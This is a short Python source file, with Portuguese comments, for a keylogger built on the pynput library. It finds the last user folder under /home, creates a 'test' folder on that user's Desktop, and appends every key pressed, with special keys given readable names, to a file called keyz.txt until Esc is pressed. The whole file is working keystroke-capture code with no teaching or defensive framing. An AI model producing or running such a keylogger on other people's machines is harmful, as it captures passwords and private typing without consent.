from pynput.keyboard import Key, Listener #imports
import os

logs = 'keyz.txt'
Users = os.listdir('/home/')
user = Users[-1]
path_log = '/home/'+ user + '/Desktop/test'
if os.path.exists(path_log):
	pass
elif not os.path.exists(path_log):
	os.mkdir(path_log)
os.chdir(path_log)

def IsSpecial(key): # substiuindo teclas pro nosso gosto
    keylist = {Key.ctrl_l:'<CTRL>',Key.ctrl_r:'<CTRL_direito>',Key.alt_l:'<ALT>',
    Key.alt_r:'<ALT_direito>',Key.space:'<SPACE>',Key.backspace:'<BACKSPACE>',
    Key.enter:'<ENTER>',Key.caps_lock:'<CAPSLOCK>',Key.shift:'<SHIFT>',
    Key.shift_r:'<SHIFT_direito>',Key.tab:'<TAB>',Key.esc:'<ESC>',Key.up:'<UP>',
    Key.down:'<DOWN>',Key.right:'<RIGHT>',Key.left:'<LEFT>',Key.cmd:'<WINDOWS>', Key.print_screen:'<PRINT>'} 

    try:
        newkey = keylist[key]
        return newkey
    except:
        return key
    
def on_press(key): #Quando a tecla eh pressionada
    arq = open(logs, 'a')
    arq.write(str(IsSpecial(key))+ '')
    arq.close()
    #print(IsSpecial(key))
    if key == Key.esc:
        return False

with Listener(on_press=on_press) as listener:
    listener.join() #inicia a escuta
